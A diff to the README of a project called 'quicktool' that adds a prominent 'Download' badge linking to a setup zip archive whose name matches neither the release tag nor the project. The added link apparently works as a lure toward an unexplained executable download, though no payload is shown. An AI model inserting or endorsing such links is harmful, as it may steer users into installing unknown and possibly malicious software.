@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/⬇_Get-Setuv2.1.2.5.zip-success?style=for-the-badge)](https://github.com/ivan-millercode1999g0/quicktool/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # ⚡ quicktool
 
 ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue.svg)
